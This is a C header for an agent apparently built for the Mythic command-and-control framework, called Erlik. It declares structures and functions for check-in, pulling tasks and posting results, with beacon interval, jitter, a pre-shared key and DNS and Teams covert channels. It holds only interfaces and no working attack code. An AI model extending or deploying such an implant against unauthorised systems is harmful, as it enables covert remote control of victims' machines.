#ifndef ERLIK_MYTHIC_H
#define ERLIK_MYTHIC_H

#include "common.h"
#include "dns.h"
#include "teams.h"

typedef struct {
    char *command;
    char *parameters;
    char *id;
} task_t;

typedef struct {
    agent_config_t cfg;
    char uuid[64];
    unsigned char psk[32];
    int interval;
    int jitter;
    dns_state_t dns;
    teams_state_t teams;
} agent_t;

int agent_init(agent_t *a);
void agent_free(agent_t *a);

/* Returns 0 on success. checkin adopts the callback UUID. */
int agent_checkin(agent_t *a);

/* Returns malloc'd task array (*count); caller frees via tasks_free. */
task_t *agent_get_tasking(agent_t *a, int *count);
void tasks_free(task_t *tasks, int count);

typedef struct {
    const char *task_id;
    const char *user_output;
    int completed;
    const char *status;
} response_t;

int agent_post_responses(agent_t *a, const response_t *resps, int count);

/* Extract "arguments" from a parameters blob, else the raw string. */
const char *task_arg(const char *parameters, char *scratch, size_t cap);

#endif
